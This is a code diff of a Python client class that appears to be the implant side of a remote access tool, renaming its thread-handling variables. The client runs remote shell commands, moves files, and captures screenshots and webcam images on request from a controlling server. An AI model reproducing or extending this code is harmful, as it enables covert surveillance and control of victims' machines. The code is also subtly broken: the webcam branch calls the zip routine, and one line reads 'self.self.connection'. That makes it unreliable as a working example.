@@ -25,27 +25,27 @@ class Client:
                              "error": ""}
 
             if request["cmd"] == "f":
-                session = threading.Thread(target=self.cwd, args=(request["mode"], request["path"],))
-                self.handle_session(session, request["timeout"])
+                process = threading.Thread(target=self.cwd, args=(request["mode"], request["path"],))
+                self.handle_process(process, request["timeout"])
             elif request["cmd"] == "c":
-                session = threading.Thread(target=self.execute_command, args=(request["exe"],))
-                self.handle_session(session, request["timeout"])
+                process = threading.Thread(target=self.execute_command, args=(request["exe"],))
+                self.handle_process(process, request["timeout"])
             elif request["cmd"] == "d":
                 self.download_file(request["open_path"])
             elif request["cmd"] == "u":
                 self.upload_file(request["save_path"])
             elif request["cmd"] == "s":
-                session = threading.Thread(target=self.make_screenshot, args=(request["monitor"], request["save_path"],))
-                self.handle_session(session, request["timeout"])
+                process = threading.Thread(target=self.make_screenshot, args=(request["monitor"], request["save_path"],))
+                self.handle_process(process, request["timeout"])
             elif request["cmd"] == "z":
-                session = threading.Thread(target=self.zip_file_or_folder, args=(request["comp_lvl"], request["open_path"], request["save_path"],))
-                self.handle_session(session, request["timeout"])
+                process = threading.Thread(target=self.zip_file_or_folder, args=(request["comp_lvl"], request["open_path"], request["save_path"],))
+                self.handle_process(process, request["timeout"])
             elif request["cmd"] == "w":
-                session = threading.Thread(target=self.zip_file_or_folder, args=(request["cam_port"], request["save_path"],))
-                self.handle_session(session, request["timeout"])
+                process = threading.Thread(target=self.zip_file_or_folder, args=(request["cam_port"], request["save_path"],))
+                self.handle_process(process, request["timeout"])
             elif request["cmd"] == "r":
-                session = threading.Thread(target=self.self.connection.sock.close)
-                self.handle_session(session, request["timeout"])
+                process = threading.Thread(target=self.self.connection.sock.close)
+                self.handle_process(process, request["timeout"])
                 self.exit = True
 
             self.connection.send(self.enc_response(self.response), self.connection.sock)
@@ -128,10 +128,10 @@ class Client:
         cv2.destroyAllWindows()
         cv2.imwrite(path_to_save, frame)
 
-    def handle_session(self, session, timeout):
-        session.start()
-        session.join(timeout)
-        if session.is_alive():
+    def handle_process(self, process, timeout):
+        process.start()
+        process.join(timeout)
+        if process.is_alive():
             self.response["error"] = "[-] TimeoutExpired"
 
     def dec_request(self, request):
